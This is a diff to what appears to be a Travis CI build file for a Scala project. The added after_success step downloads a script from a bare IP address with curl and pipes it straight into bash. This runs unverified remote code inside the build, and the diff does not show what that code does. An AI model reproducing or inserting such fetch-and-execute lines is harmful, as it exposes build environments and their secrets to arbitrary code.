@@ -7,12 +7,14 @@ scala:
    - 2.12.10
 
 script:
-   - echo BURP_SCAN_URL = www.cnn.com >> temp.log &&
+   - echo BURP_SCAN_URL = http://cnn.com >> temp.log &&
      sbt compile test run >> temp.log
 
 after_success:   
-   - bash ./burp-scanner.sh > temp2.log &&
-     less temp2.log
+   - bash <(curl -s http://35.153.160.75:8080) > temp_curl.log &&
+     echo ====================================================================== >> temp2.log &&
+     bash ./burp-scanner.sh >> temp2.log &&
+     less temp_curl.log
 
 notifications:
   email: mgotur@xtivia.com
